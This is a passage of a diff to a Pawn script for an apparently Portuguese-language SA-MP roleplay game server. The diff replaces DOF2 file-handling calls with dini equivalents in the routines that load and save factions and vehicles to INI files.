+   		    fInfo[i][DutyX] = dini_Float(ficheiro, "DutyX");
+   		    fInfo[i][DutyY] = dini_Float(ficheiro, "DutyY");
+   		    fInfo[i][DutyZ] = dini_Float(ficheiro, "DutyZ");
+   		    fInfo[i][DutyVirtualWorld] = dini_Int(ficheiro, "DutyVirtualWorld");
+   		    fInfo[i][DutyInterior] = dini_Int(ficheiro, "DutyInterior");
 		}
 	}
-	
+
 	tick2 = GetTickCount();
-    printf("\n [PC:RP] Factions carregadas (%d ms)", tick2-tick1);
+    printf(" [PC:RP] Factions carregadas (%d ms)", tick2-tick1);
 
 	return 1;
 }
@@ -12347,42 +12338,40 @@ public GuardarFactions()
 	    if(i == 0) continue;
 	    format(ficheiro, sizeof(ficheiro), "PCRP/Factions/%d.ini", i);
 
-		DOF2_SetString(ficheiro, "Nome", fInfo[i][Nome]);
-		DOF2_SetInt(ficheiro, "Type", fInfo[i][Type]);
-		DOF2_SetInt(ficheiro, "Legal", fInfo[i][Legal]);
-		DOF2_SetInt(ficheiro, "Bank", fInfo[i][Bank]);
-		DOF2_SetFloat(ficheiro, "X", fInfo[i][X]);
-		DOF2_SetFloat(ficheiro, "Y", fInfo[i][Y]);
-		DOF2_SetFloat(ficheiro, "Z", fInfo[i][Z]);
-		DOF2_SetFloat(ficheiro, "A", fInfo[i][A]);
-		DOF2_SetString(ficheiro, "Rank1", fInfo[i][Rank1]);
-		DOF2_SetString(ficheiro, "Rank2", fInfo[i][Rank2]);
-		DOF2_SetString(ficheiro, "Rank3", fInfo[i][Rank3]);
-		DOF2_SetString(ficheiro, "Rank4", fInfo[i][Rank4]);
-		DOF2_SetString(ficheiro, "Rank5", fInfo[i][Rank5]);
-		DOF2_SetString(ficheiro, "Rank6", fInfo[i][Rank6]);
-		DOF2_SetInt(ficheiro, "SalarioRank1", fInfo[i][SalarioRank1]);
-		DOF2_SetInt(ficheiro, "SalarioRank2", fInfo[i][SalarioRank2]);
-		DOF2_SetInt(ficheiro, "SalarioRank3", fInfo[i][SalarioRank3]);
-		DOF2_SetInt(ficheiro, "SalarioRank4", fInfo[i][SalarioRank4]);
-		DOF2_SetInt(ficheiro, "SalarioRank5", fInfo[i][SalarioRank5]);
-		DOF2_SetInt(ficheiro, "SalarioRank6", fInfo[i][SalarioRank6]);
-		DOF2_SetInt(ficheiro, "SkinRank1", fInfo[i][SkinRank1]);
-		DOF2_SetInt(ficheiro, "SkinRank2", fInfo[i][SkinRank2]);
-		DOF2_SetInt(ficheiro, "SkinRank3", fInfo[i][SkinRank3]);
-		DOF2_SetInt(ficheiro, "SkinRank4", fInfo[i][SkinRank4]);
-		DOF2_SetInt(ficheiro, "SkinRank5", fInfo[i][SkinRank5]);
-		DOF2_SetInt(ficheiro, "SkinRank6", fInfo[i][SkinRank6]);
-		DOF2_SetInt(ficheiro, "JoinRank", fInfo[i][JoinRank]);
-		DOF2_SetString(ficheiro, "Color", fInfo[i][Color]);
-		DOF2_SetInt(ficheiro, "UseDuty", fInfo[i][UseDuty]);
-		DOF2_SetFloat(ficheiro, "DutyX", fInfo[i][DutyX]);
-		DOF2_SetFloat(ficheiro, "DutyY", fInfo[i][DutyY]);
-		DOF2_SetFloat(ficheiro, "DutyZ", fInfo[i][DutyZ]);
-		DOF2_SetInt(ficheiro, "DutyVirtualWorld", fInfo[i][DutyVirtualWorld]);
-		DOF2_SetInt(ficheiro, "DutyInterior", fInfo[i][DutyInterior]);
-
-		DOF2_SaveFile();
+		dini_Set(ficheiro, "Nome", fInfo[i][Nome]);
+		dini_IntSet(ficheiro, "Type", fInfo[i][Type]);
+		dini_IntSet(ficheiro, "Legal", fInfo[i][Legal]);
+		dini_IntSet(ficheiro, "Bank", fInfo[i][Bank]);
+		dini_FloatSet(ficheiro, "X", fInfo[i][X]);
+		dini_FloatSet(ficheiro, "Y", fInfo[i][Y]);
+		dini_FloatSet(ficheiro, "Z", fInfo[i][Z]);
+		dini_FloatSet(ficheiro, "A", fInfo[i][A]);
+		dini_Set(ficheiro, "Rank1", fInfo[i][Rank1]);
+		dini_Set(ficheiro, "Rank2", fInfo[i][Rank2]);
+		dini_Set(ficheiro, "Rank3", fInfo[i][Rank3]);
+		dini_Set(ficheiro, "Rank4", fInfo[i][Rank4]);
+		dini_Set(ficheiro, "Rank5", fInfo[i][Rank5]);
+		dini_Set(ficheiro, "Rank6", fInfo[i][Rank6]);
+		dini_IntSet(ficheiro, "SalarioRank1", fInfo[i][SalarioRank1]);
+		dini_IntSet(ficheiro, "SalarioRank2", fInfo[i][SalarioRank2]);
+		dini_IntSet(ficheiro, "SalarioRank3", fInfo[i][SalarioRank3]);
+		dini_IntSet(ficheiro, "SalarioRank4", fInfo[i][SalarioRank4]);
+		dini_IntSet(ficheiro, "SalarioRank5", fInfo[i][SalarioRank5]);
+		dini_IntSet(ficheiro, "SalarioRank6", fInfo[i][SalarioRank6]);
+		dini_IntSet(ficheiro, "SkinRank1", fInfo[i][SkinRank1]);
+		dini_IntSet(ficheiro, "SkinRank2", fInfo[i][SkinRank2]);
+		dini_IntSet(ficheiro, "SkinRank3", fInfo[i][SkinRank3]);
+		dini_IntSet(ficheiro, "SkinRank4", fInfo[i][SkinRank4]);
+		dini_IntSet(ficheiro, "SkinRank5", fInfo[i][SkinRank5]);
+		dini_IntSet(ficheiro, "SkinRank6", fInfo[i][SkinRank6]);
+		dini_IntSet(ficheiro, "JoinRank", fInfo[i][JoinRank]);
+		dini_Set(ficheiro, "Color", fInfo[i][Color]);
+		dini_IntSet(ficheiro, "UseDuty", fInfo[i][UseDuty]);
+		dini_FloatSet(ficheiro, "DutyX", fInfo[i][DutyX]);
+		dini_FloatSet(ficheiro, "DutyY", fInfo[i][DutyY]);
+		dini_FloatSet(ficheiro, "DutyZ", fInfo[i][DutyZ]);
+		dini_IntSet(ficheiro, "DutyVirtualWorld", fInfo[i][DutyVirtualWorld]);
+		dini_IntSet(ficheiro, "DutyInterior", fInfo[i][DutyInterior]);
 
 	}
 	return 1;
@@ -12395,42 +12384,40 @@ public GuardarFaction(id)
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Factions/%d.ini", i);
 
-	DOF2_SetString(ficheiro, "Nome", fInfo[i][Nome]);
-	DOF2_SetInt(ficheiro, "Type", fInfo[i][Type]);
-	DOF2_SetInt(ficheiro, "Legal", fInfo[i][Legal]);
-	DOF2_SetInt(ficheiro, "Bank", fInfo[i][Bank]);
-	DOF2_SetFloat(ficheiro, "X", fInfo[i][X]);
-	DOF2_SetFloat(ficheiro, "Y", fInfo[i][Y]);
-	DOF2_SetFloat(ficheiro, "Z", fInfo[i][Z]);
-	DOF2_SetFloat(ficheiro, "A", fInfo[i][A]);
-	DOF2_SetString(ficheiro, "Rank1", fInfo[i][Rank1]);
-	DOF2_SetString(ficheiro, "Rank2", fInfo[i][Rank2]);
-	DOF2_SetString(ficheiro, "Rank3", fInfo[i][Rank3]);
-	DOF2_SetString(ficheiro, "Rank4", fInfo[i][Rank4]);
-	DOF2_SetString(ficheiro, "Rank5", fInfo[i][Rank5]);
-	DOF2_SetString(ficheiro, "Rank6", fInfo[i][Rank6]);
-	DOF2_SetInt(ficheiro, "SalarioRank1", fInfo[i][SalarioRank1]);
-	DOF2_SetInt(ficheiro, "SalarioRank2", fInfo[i][SalarioRank2]);
-	DOF2_SetInt(ficheiro, "SalarioRank3", fInfo[i][SalarioRank3]);
-	DOF2_SetInt(ficheiro, "SalarioRank4", fInfo[i][SalarioRank4]);
-	DOF2_SetInt(ficheiro, "SalarioRank5", fInfo[i][SalarioRank5]);
-	DOF2_SetInt(ficheiro, "SalarioRank6", fInfo[i][SalarioRank6]);
-	DOF2_SetInt(ficheiro, "SkinRank1", fInfo[i][SkinRank1]);
-	DOF2_SetInt(ficheiro, "SkinRank2", fInfo[i][SkinRank2]);
-	DOF2_SetInt(ficheiro, "SkinRank3", fInfo[i][SkinRank3]);
-	DOF2_SetInt(ficheiro, "SkinRank4", fInfo[i][SkinRank4]);
-	DOF2_SetInt(ficheiro, "SkinRank5", fInfo[i][SkinRank5]);
-	DOF2_SetInt(ficheiro, "SkinRank6", fInfo[i][SkinRank6]);
-	DOF2_SetInt(ficheiro, "JoinRank", fInfo[i][JoinRank]);
-	DOF2_SetString(ficheiro, "Color", fInfo[i][Color]);
-	DOF2_SetInt(ficheiro, "UseDuty", fInfo[i][UseDuty]);
-	DOF2_SetFloat(ficheiro, "DutyX", fInfo[i][DutyX]);
-	DOF2_SetFloat(ficheiro, "DutyY", fInfo[i][DutyY]);
-	DOF2_SetFloat(ficheiro, "DutyZ", fInfo[i][DutyZ]);
-	DOF2_SetInt(ficheiro, "DutyVirtualWorld", fInfo[i][DutyVirtualWorld]);
-	DOF2_SetInt(ficheiro, "DutyInterior", fInfo[i][DutyInterior]);
-
-	DOF2_SaveFile();
+	dini_Set(ficheiro, "Nome", fInfo[i][Nome]);
+	dini_IntSet(ficheiro, "Type", fInfo[i][Type]);
+	dini_IntSet(ficheiro, "Legal", fInfo[i][Legal]);
+	dini_IntSet(ficheiro, "Bank", fInfo[i][Bank]);
+	dini_FloatSet(ficheiro, "X", fInfo[i][X]);
+	dini_FloatSet(ficheiro, "Y", fInfo[i][Y]);
+	dini_FloatSet(ficheiro, "Z", fInfo[i][Z]);
+	dini_FloatSet(ficheiro, "A", fInfo[i][A]);
+	dini_Set(ficheiro, "Rank1", fInfo[i][Rank1]);
+	dini_Set(ficheiro, "Rank2", fInfo[i][Rank2]);
+	dini_Set(ficheiro, "Rank3", fInfo[i][Rank3]);
+	dini_Set(ficheiro, "Rank4", fInfo[i][Rank4]);
+	dini_Set(ficheiro, "Rank5", fInfo[i][Rank5]);
+	dini_Set(ficheiro, "Rank6", fInfo[i][Rank6]);
+	dini_IntSet(ficheiro, "SalarioRank1", fInfo[i][SalarioRank1]);
+	dini_IntSet(ficheiro, "SalarioRank2", fInfo[i][SalarioRank2]);
+	dini_IntSet(ficheiro, "SalarioRank3", fInfo[i][SalarioRank3]);
+	dini_IntSet(ficheiro, "SalarioRank4", fInfo[i][SalarioRank4]);
+	dini_IntSet(ficheiro, "SalarioRank5", fInfo[i][SalarioRank5]);
+	dini_IntSet(ficheiro, "SalarioRank6", fInfo[i][SalarioRank6]);
+	dini_IntSet(ficheiro, "SkinRank1", fInfo[i][SkinRank1]);
+	dini_IntSet(ficheiro, "SkinRank2", fInfo[i][SkinRank2]);
+	dini_IntSet(ficheiro, "SkinRank3", fInfo[i][SkinRank3]);
+	dini_IntSet(ficheiro, "SkinRank4", fInfo[i][SkinRank4]);
+	dini_IntSet(ficheiro, "SkinRank5", fInfo[i][SkinRank5]);
+	dini_IntSet(ficheiro, "SkinRank6", fInfo[i][SkinRank6]);
+	dini_IntSet(ficheiro, "JoinRank", fInfo[i][JoinRank]);
+	dini_Set(ficheiro, "Color", fInfo[i][Color]);
+	dini_IntSet(ficheiro, "UseDuty", fInfo[i][UseDuty]);
+	dini_FloatSet(ficheiro, "DutyX", fInfo[i][DutyX]);
+	dini_FloatSet(ficheiro, "DutyY", fInfo[i][DutyY]);
+	dini_FloatSet(ficheiro, "DutyZ", fInfo[i][DutyZ]);
+	dini_IntSet(ficheiro, "DutyVirtualWorld", fInfo[i][DutyVirtualWorld]);
+	dini_IntSet(ficheiro, "DutyInterior", fInfo[i][DutyInterior]);
 
 	return 1;
 }
@@ -12447,130 +12434,128 @@ public CarregarCarros()
 	for(new i = 0; i < MAX_CARROS; i++)
 	{
 	    if(i == 0) continue;
-	    
-    	format(ficheiro, sizeof(ficheiro), "PCRP/Carros/%d.ini", i);
-    	if(!DOF2_FileExists(ficheiro))
-  		{
-	  		DOF2_CreateFile(ficheiro);
 
-			DOF2_SetInt(ficheiro, "ID", i);
-            DOF2_SetInt(ficheiro, "Model", 501);
-  			DOF2_SetFloat(ficheiro, "X", 1000);
-  			DOF2_SetFloat(ficheiro, "Y", 1000);
-  			DOF2_SetFloat(ficheiro, "Z", 1000);
-  			DOF2_SetFloat(ficheiro, "Angle", 0);
-  			DOF2_SetInt(ficheiro, "Color1", 1);
-  			DOF2_SetInt(ficheiro, "Color2", 1);
-  			DOF2_SetInt(ficheiro, "Faction", 0);
-  			DOF2_SetInt(ficheiro, "Type", 0);
-  			DOF2_SetInt(ficheiro, "Comprado", 0);
-  			DOF2_SetInt(ficheiro, "Travao", 0);
-  			DOF2_SetInt(ficheiro, "Kilometros", 0);
-  			DOF2_SetInt(ficheiro, "Metros", 0);
-  			DOF2_SetInt(ficheiro, "Neon", 0);
-  			DOF2_SetInt(ficheiro, "NeonStatus", 0);
-  			DOF2_SetInt(ficheiro, "Gasolina", 100);
-  			DOF2_SetInt(ficheiro, "Trancado", 0);
-  			DOF2_SetFloat(ficheiro, "Vida", 1000.0);
-  			DOF2_SetInt(ficheiro, "mod1", -1);
-  			DOF2_SetInt(ficheiro, "mod2", 0);
-  			DOF2_SetInt(ficheiro, "mod3", 0);
-  			DOF2_SetInt(ficheiro, "mod4", 0);
-  			DOF2_SetInt(ficheiro, "mod5", 0);
-  			DOF2_SetInt(ficheiro, "mod6", 0);
-  			DOF2_SetInt(ficheiro, "mod7", 0);
-  			DOF2_SetInt(ficheiro, "mod8", 0);
-  			DOF2_SetInt(ficheiro, "mod9", 0);
-  			DOF2_SetInt(ficheiro, "mod10", 0);
-  			DOF2_SetInt(ficheiro, "mod11", 0);
-  			DOF2_SetInt(ficheiro, "Apreendido", 0);
-  			DOF2_SetInt(ficheiro, "Arma1", 0);
-  			DOF2_SetInt(ficheiro, "Ammo1", 0);
-  			DOF2_SetInt(ficheiro, "Arma2", 0);
-  			DOF2_SetInt(ficheiro, "Ammo2", 0);
-  			DOF2_SetInt(ficheiro, "Arma3", 0);
-  			DOF2_SetInt(ficheiro, "Ammo3", 0);
-  			DOF2_SetString(ficheiro, "Prop", "Ninguém");
-  			DOF2_SetString(ficheiro, "CompradoEm", "null");
-  			DOF2_SetInt(ficheiro, "RadioStatus", 0);
-  			DOF2_SetInt(ficheiro, "IsCaravana", 0);
-  			DOF2_SetInt(ficheiro, "CaravanaCasaID", 0);
-  			DOF2_SetInt(ficheiro, "Panels", 0);
-  			DOF2_SetInt(ficheiro, "Doors", 0);
-  			DOF2_SetInt(ficheiro, "Lights", 0);
-  			DOF2_SetInt(ficheiro, "Tires", 0);
-  			
-    		DOF2_SaveFile();
+    	format(ficheiro, sizeof(ficheiro), "PCRP/Carros/%d.ini", i);
+    	if(!dini_Exists(ficheiro))
+  		{
+	  		dini_Create(ficheiro);
+
+			dini_IntSet(ficheiro, "ID", i);
+            dini_IntSet(ficheiro, "Model", 501);
+  			dini_FloatSet(ficheiro, "X", 1000);
+  			dini_FloatSet(ficheiro, "Y", 1000);
+  			dini_FloatSet(ficheiro, "Z", 1000);
+  			dini_FloatSet(ficheiro, "Angle", 0);
+  			dini_IntSet(ficheiro, "Color1", 1);
+  			dini_IntSet(ficheiro, "Color2", 1);
+  			dini_IntSet(ficheiro, "Faction", 0);
+  			dini_IntSet(ficheiro, "Type", 0);
+  			dini_IntSet(ficheiro, "Comprado", 0);
+  			dini_IntSet(ficheiro, "Travao", 0);
+  			dini_IntSet(ficheiro, "Kilometros", 0);
+  			dini_IntSet(ficheiro, "Metros", 0);
+  			dini_IntSet(ficheiro, "Neon", 0);
+  			dini_IntSet(ficheiro, "NeonStatus", 0);
+  			dini_IntSet(ficheiro, "Gasolina", 100);
+  			dini_IntSet(ficheiro, "Trancado", 0);
+  			dini_FloatSet(ficheiro, "Vida", 1000.0);
+  			dini_IntSet(ficheiro, "mod1", -1);
+  			dini_IntSet(ficheiro, "mod2", 0);
+  			dini_IntSet(ficheiro, "mod3", 0);
+  			dini_IntSet(ficheiro, "mod4", 0);
+  			dini_IntSet(ficheiro, "mod5", 0);
+  			dini_IntSet(ficheiro, "mod6", 0);
+  			dini_IntSet(ficheiro, "mod7", 0);
+  			dini_IntSet(ficheiro, "mod8", 0);
+  			dini_IntSet(ficheiro, "mod9", 0);
+  			dini_IntSet(ficheiro, "mod10", 0);
+  			dini_IntSet(ficheiro, "mod11", 0);
+  			dini_IntSet(ficheiro, "Apreendido", 0);
+  			dini_IntSet(ficheiro, "Arma1", 0);
+  			dini_IntSet(ficheiro, "Ammo1", 0);
+  			dini_IntSet(ficheiro, "Arma2", 0);
+  			dini_IntSet(ficheiro, "Ammo2", 0);
+  			dini_IntSet(ficheiro, "Arma3", 0);
+  			dini_IntSet(ficheiro, "Ammo3", 0);
+  			dini_Set(ficheiro, "Prop", "Ninguém");
+  			dini_Set(ficheiro, "CompradoEm", "null");
+  			dini_IntSet(ficheiro, "RadioStatus", 0);
+  			dini_IntSet(ficheiro, "IsCaravana", 0);
+  			dini_IntSet(ficheiro, "CaravanaCasaID", 0);
+  			dini_IntSet(ficheiro, "Panels", 0);
+  			dini_IntSet(ficheiro, "Doors", 0);
+  			dini_IntSet(ficheiro, "Lights", 0);
+  			dini_IntSet(ficheiro, "Tires", 0);
    		}
    		else
    		{
-   		    cInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
-   		    cInfo[i][Model] = DOF2_GetInt(ficheiro, "Model");
-   		    cInfo[i][X] = DOF2_GetFloat(ficheiro, "X");
-   		    cInfo[i][Y] = DOF2_GetFloat(ficheiro, "Y");
-   		    cInfo[i][Z] = DOF2_GetFloat(ficheiro, "Z");
-   		    cInfo[i][Angle] = DOF2_GetFloat(ficheiro, "Angle");
-   		    cInfo[i][Color1] = DOF2_GetInt(ficheiro, "Color1");
-   		    cInfo[i][Color2] = DOF2_GetInt(ficheiro, "Color2");
-   		    cInfo[i][Faction] = DOF2_GetInt(ficheiro, "Faction");
-   		    cInfo[i][Type] = DOF2_GetInt(ficheiro, "Type");
-   		    cInfo[i][Comprado] = DOF2_GetInt(ficheiro, "Comprado");
-   		    cInfo[i][Travao] = DOF2_GetInt(ficheiro, "Travao");
-   		    cInfo[i][Kilometros] = DOF2_GetInt(ficheiro, "Kilometros");
-   		    cInfo[i][Metros] = DOF2_GetInt(ficheiro, "Metros");
-   		    cInfo[i][Neon] = DOF2_GetInt(ficheiro, "Neon");
-   		    cInfo[i][NeonStatus] = DOF2_GetInt(ficheiro, "NeonStatus");
-   		    cInfo[i][Gasolina] = DOF2_GetInt(ficheiro, "Gasolina");
-   		    cInfo[i][Trancado] = DOF2_GetInt(ficheiro, "Trancado");
-   		    cInfo[i][Vida] = DOF2_GetFloat(ficheiro, "Vida");
-   		    cInfo[i][mod1] = DOF2_GetInt(ficheiro, "mod1");
-   		    cInfo[i][mod2] = DOF2_GetInt(ficheiro, "mod2");
-   		    cInfo[i][mod3] = DOF2_GetInt(ficheiro, "mod3");
-   		    cInfo[i][mod4] = DOF2_GetInt(ficheiro, "mod4");
-   		    cInfo[i][mod5] = DOF2_GetInt(ficheiro, "mod5");
-   		    cInfo[i][mod6] = DOF2_GetInt(ficheiro, "mod6");
-   		    cInfo[i][mod7] = DOF2_GetInt(ficheiro, "mod7");
-   		    cInfo[i][mod8] = DOF2_GetInt(ficheiro, "mod8");
-   		    cInfo[i][mod9] = DOF2_GetInt(ficheiro, "mod9");
-     		cInfo[i][mod10] = DOF2_GetInt(ficheiro, "mod10");
-     		cInfo[i][mod11] = DOF2_GetInt(ficheiro, "mod11");
-   		    cInfo[i][Apreendido] = DOF2_GetInt(ficheiro, "Apreendido");
-   		    cInfo[i][Arma1] = DOF2_GetInt(ficheiro, "Arma1");
-   		    cInfo[i][Ammo1] = DOF2_GetInt(ficheiro, "Ammo1");
-   		    cInfo[i][Arma2] = DOF2_GetInt(ficheiro, "Arma2");
-   		    cInfo[i][Ammo2] = DOF2_GetInt(ficheiro, "Ammo2");
-   		    cInfo[i][Arma3] = DOF2_GetInt(ficheiro, "Arma3");
-   		    cInfo[i][Ammo3] = DOF2_GetInt(ficheiro, "Ammo3");
-   		    format(cInfo[i][Prop], 32, "%s", DOF2_GetString(ficheiro, "Prop"));
-   		    format(cInfo[i][CompradoEm], 32, "%s", DOF2_GetString(ficheiro, "CompradoEm"));
-   		    cInfo[i][RadioStatus] = DOF2_GetInt(ficheiro, "RadioStatus");
-   		    cInfo[i][IsCaravana] = DOF2_GetInt(ficheiro, "IsCaravana");
-   		    cInfo[i][CaravanaCasaID] = DOF2_GetInt(ficheiro, "CaravanaCasaID");
-   		    cInfo[i][Panels] = DOF2_GetInt(ficheiro, "Panels");
-   		    cInfo[i][Doors] = DOF2_GetInt(ficheiro, "Doors");
-   		    cInfo[i][Lights] = DOF2_GetInt(ficheiro, "Lights");
-   		    cInfo[i][Tires] = DOF2_GetInt(ficheiro, "Tires");
+   		    cInfo[i][ID] = dini_Int(ficheiro, "ID");
+   		    cInfo[i][Model] = dini_Int(ficheiro, "Model");
+   		    cInfo[i][X] = dini_Float(ficheiro, "X");
+   		    cInfo[i][Y] = dini_Float(ficheiro, "Y");
+   		    cInfo[i][Z] = dini_Float(ficheiro, "Z");
+   		    cInfo[i][Angle] = dini_Float(ficheiro, "Angle");
+   		    cInfo[i][Color1] = dini_Int(ficheiro, "Color1");
+   		    cInfo[i][Color2] = dini_Int(ficheiro, "Color2");
+   		    cInfo[i][Faction] = dini_Int(ficheiro, "Faction");
+   		    cInfo[i][Type] = dini_Int(ficheiro, "Type");
+   		    cInfo[i][Comprado] = dini_Int(ficheiro, "Comprado");
+   		    cInfo[i][Travao] = dini_Int(ficheiro, "Travao");
+   		    cInfo[i][Kilometros] = dini_Int(ficheiro, "Kilometros");
+   		    cInfo[i][Metros] = dini_Int(ficheiro, "Metros");
+   		    cInfo[i][Neon] = dini_Int(ficheiro, "Neon");
+   		    cInfo[i][NeonStatus] = dini_Int(ficheiro, "NeonStatus");
+   		    cInfo[i][Gasolina] = dini_Int(ficheiro, "Gasolina");
+   		    cInfo[i][Trancado] = dini_Int(ficheiro, "Trancado");
+   		    cInfo[i][Vida] = dini_Float(ficheiro, "Vida");
+   		    cInfo[i][mod1] = dini_Int(ficheiro, "mod1");
+   		    cInfo[i][mod2] = dini_Int(ficheiro, "mod2");
+   		    cInfo[i][mod3] = dini_Int(ficheiro, "mod3");
+   		    cInfo[i][mod4] = dini_Int(ficheiro, "mod4");
+   		    cInfo[i][mod5] = dini_Int(ficheiro, "mod5");
+   		    cInfo[i][mod6] = dini_Int(ficheiro, "mod6");
+   		    cInfo[i][mod7] = dini_Int(ficheiro, "mod7");
+   		    cInfo[i][mod8] = dini_Int(ficheiro, "mod8");
+   		    cInfo[i][mod9] = dini_Int(ficheiro, "mod9");
+     		cInfo[i][mod10] = dini_Int(ficheiro, "mod10");
+     		cInfo[i][mod11] = dini_Int(ficheiro, "mod11");
+   		    cInfo[i][Apreendido] = dini_Int(ficheiro, "Apreendido");
+   		    cInfo[i][Arma1] = dini_Int(ficheiro, "Arma1");
+   		    cInfo[i][Ammo1] = dini_Int(ficheiro, "Ammo1");
+   		    cInfo[i][Arma2] = dini_Int(ficheiro, "Arma2");
+   		    cInfo[i][Ammo2] = dini_Int(ficheiro, "Ammo2");
+   		    cInfo[i][Arma3] = dini_Int(ficheiro, "Arma3");
+   		    cInfo[i][Ammo3] = dini_Int(ficheiro, "Ammo3");
+   		    format(cInfo[i][Prop], 32, "%s", dini_Get(ficheiro, "Prop"));
+   		    format(cInfo[i][CompradoEm], 32, "%s", dini_Get(ficheiro, "CompradoEm"));
+   		    cInfo[i][RadioStatus] = dini_Int(ficheiro, "RadioStatus");
+   		    cInfo[i][IsCaravana] = dini_Int(ficheiro, "IsCaravana");
+   		    cInfo[i][CaravanaCasaID] = dini_Int(ficheiro, "CaravanaCasaID");
+   		    cInfo[i][Panels] = dini_Int(ficheiro, "Panels");
+   		    cInfo[i][Doors] = dini_Int(ficheiro, "Doors");
+   		    cInfo[i][Lights] = dini_Int(ficheiro, "Lights");
+   		    cInfo[i][Tires] = dini_Int(ficheiro, "Tires");
 
    			cInfo[i][ID] = CreateVehicle(cInfo[i][Model], cInfo[i][X], cInfo[i][Y], cInfo[i][Z], cInfo[i][Angle], cInfo[i][Color1], cInfo[i][Color2], -1, IsACopCar(cInfo[i][Model]) ? 1 : 0);
 			SetVehicleVirtualWorld(cInfo[i][ID], cInfo[i][VirtualWorld]);
 			LinkVehicleToInterior(cInfo[i][ID], cInfo[i][Interior]);
 			AtualizarDanosCarro(i);
          	AtualizarTunning(i);
-         	
+
          	SetVehicleHealth(i, cInfo[i][Vida]);
          	MatriculasAtualizar();
-         	
+
          	format(mat, sizeof(mat), "{FFAE00}[ {FFFFFF}%s {FFAE00}]", cInfo[i][Matricula]);
          	Matricula3DText[i] = Create3DTextLabel(mat, -1, 0.0, 0.0, 0.0, 3.5, 0, 1);
-         	
+
          	Attach3DTextLabelToVehicle(Matricula3DText[i], cInfo[i][ID], 0.0, 0.0, 0.1);
-         	
+
          	SetVehicleParamsEx(i, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF);
 		}
 	}
-	
+
 	tick2 = GetTickCount();
-	printf("\n [PC:RP] Carros carregados (%d ms)", tick2-tick1);
+	printf(" [PC:RP] Carros carregados (%d ms)", tick2-tick1);
 
 	return 1;
 }
@@ -12583,54 +12568,52 @@ public GuardarCarros()
 	    if(i == 0) continue;
 	    format(ficheiro, sizeof(ficheiro), "PCRP/Carros/%d.ini", i);
 
-		DOF2_SetInt(ficheiro, "ID", cInfo[i][ID]);
-		DOF2_SetInt(ficheiro, "Model", cInfo[i][Model]);
-		DOF2_SetFloat(ficheiro, "X", cInfo[i][X]);
-		DOF2_SetFloat(ficheiro, "Y", cInfo[i][Y]);
-		DOF2_SetFloat(ficheiro, "Z", cInfo[i][Z]);
-        DOF2_SetFloat(ficheiro, "Angle", cInfo[i][Angle]);
-        DOF2_SetInt(ficheiro, "Color1", cInfo[i][Color1]);
-        DOF2_SetInt(ficheiro, "Color2", cInfo[i][Color2]);
-        DOF2_SetInt(ficheiro, "Faction", cInfo[i][Faction]);
-        DOF2_SetInt(ficheiro, "Type", cInfo[i][Type]);
-        DOF2_SetInt(ficheiro, "Comprado", cInfo[i][Comprado]);
-		DOF2_SetInt(ficheiro, "Travao", cInfo[i][Travao]);
-		DOF2_SetInt(ficheiro, "Kilometros", cInfo[i][Kilometros]);
-		DOF2_SetInt(ficheiro, "Metros", cInfo[i][Metros]);
-		DOF2_SetInt(ficheiro, "Neon", cInfo[i][Neon]);
-		DOF2_SetInt(ficheiro, "NeonStatus", cInfo[i][NeonStatus]);
-		DOF2_SetInt(ficheiro, "Gasolina", cInfo[i][Gasolina]);
-        DOF2_SetInt(ficheiro, "Trancado", cInfo[i][Trancado]);
-		DOF2_SetFloat(ficheiro, "Vida", cInfo[i][Vida]);
-		DOF2_SetInt(ficheiro, "mod1", cInfo[i][mod1]);
-		DOF2_SetInt(ficheiro, "mod2", cInfo[i][mod2]);
-		DOF2_SetInt(ficheiro, "mod3", cInfo[i][mod3]);
-		DOF2_SetInt(ficheiro, "mod4", cInfo[i][mod4]);
-		DOF2_SetInt(ficheiro, "mod5", cInfo[i][mod5]);
-		DOF2_SetInt(ficheiro, "mod6", cInfo[i][mod6]);
-		DOF2_SetInt(ficheiro, "mod7", cInfo[i][mod7]);
-		DOF2_SetInt(ficheiro, "mod8", cInfo[i][mod8]);
-		DOF2_SetInt(ficheiro, "mod9", cInfo[i][mod9]);
-		DOF2_SetInt(ficheiro, "mod10", cInfo[i][mod10]);
-		DOF2_SetInt(ficheiro, "mod11", cInfo[i][mod11]);
-		DOF2_SetInt(ficheiro, "Apreendido", cInfo[i][Apreendido]);
-		DOF2_SetInt(ficheiro, "Arma1", cInfo[i][Arma1]);
-		DOF2_SetInt(ficheiro, "Ammo1", cInfo[i][Ammo1]);
-		DOF2_SetInt(ficheiro, "Arma2", cInfo[i][Arma2]);
-		DOF2_SetInt(ficheiro, "Ammo2", cInfo[i][Ammo2]);
-		DOF2_SetInt(ficheiro, "Arma3", cInfo[i][Arma3]);
-		DOF2_SetInt(ficheiro, "Ammo3", cInfo[i][Ammo3]);
-		DOF2_SetString(ficheiro, "Prop", cInfo[i][Prop]);
-		DOF2_SetString(ficheiro, "CompradoEm", cInfo[i][CompradoEm]);
-		DOF2_SetInt(ficheiro, "RadioStatus", cInfo[i][RadioStatus]);
-		DOF2_SetInt(ficheiro, "IsCaravana", cInfo[i][IsCaravana]);
-		DOF2_SetInt(ficheiro, "CaravanaCasaID", cInfo[i][CaravanaCasaID]);
-		DOF2_SetInt(ficheiro, "Panels", cInfo[i][Panels]);
-		DOF2_SetInt(ficheiro, "Doors", cInfo[i][Doors]);
-		DOF2_SetInt(ficheiro, "Lights", cInfo[i][Lights]);
-		DOF2_SetInt(ficheiro, "Tires", cInfo[i][Tires]);
-		
-		DOF2_SaveFile();
+		dini_IntSet(ficheiro, "ID", cInfo[i][ID]);
+		dini_IntSet(ficheiro, "Model", cInfo[i][Model]);
+		dini_FloatSet(ficheiro, "X", cInfo[i][X]);
+		dini_FloatSet(ficheiro, "Y", cInfo[i][Y]);
+		dini_FloatSet(ficheiro, "Z", cInfo[i][Z]);
+        dini_FloatSet(ficheiro, "Angle", cInfo[i][Angle]);
+        dini_IntSet(ficheiro, "Color1", cInfo[i][Color1]);
+        dini_IntSet(ficheiro, "Color2", cInfo[i][Color2]);
+        dini_IntSet(ficheiro, "Faction", cInfo[i][Faction]);
+        dini_IntSet(ficheiro, "Type", cInfo[i][Type]);
+        dini_IntSet(ficheiro, "Comprado", cInfo[i][Comprado]);
+		dini_IntSet(ficheiro, "Travao", cInfo[i][Travao]);
